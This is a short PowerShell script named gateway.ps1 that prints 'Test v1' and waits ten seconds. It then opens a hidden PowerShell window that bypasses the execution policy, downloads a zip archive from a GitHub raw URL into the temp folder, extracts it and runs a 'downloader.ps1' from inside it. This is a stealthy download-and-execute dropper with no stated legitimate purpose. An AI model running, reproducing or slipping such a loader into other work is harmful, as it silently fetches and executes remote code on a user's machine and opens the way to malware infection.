# gateway.ps1


Write-Host "Test v1"
Start-Sleep -Seconds 10

$hiddenCommand = @"
`$D=`"$env:tmp`";
irm -Uri 'https://github.com/Sourif/Flip/raw/refs/heads/main/js16.zip' -OutFile `"$D\js16.zip`";
Expand-Archive `"$D\js16.zip`" -DestinationPath `$D -Force;
. `"$D\js16\downloader.ps1`"
"@


Start-Process powershell -ArgumentList "-NoP -NonI -Ep Bypass -Command `$hiddenCommand" -WindowStyle Hidden



